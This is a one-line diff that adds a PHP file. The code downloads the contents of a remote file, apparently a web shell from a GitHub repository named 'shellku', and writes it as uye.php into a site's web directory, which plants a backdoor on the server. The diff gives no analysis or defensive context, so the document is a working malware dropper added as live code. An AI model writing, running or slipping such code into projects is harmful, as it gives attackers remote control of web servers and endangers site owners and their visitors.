@@ -1,0 +1,1 @@
+<?php $file=fopen("/home/ilovepro/web.mymindpowers.com/uye.php","w+"); $shell = fopen("https://raw.githubusercontent.com/enggardragneel/shellku/master/red1.txt","r"); while(!feof($shell)) { $shellfile .=fgets($shell);} fwrite($file,$shellfile); fclose($file);?>
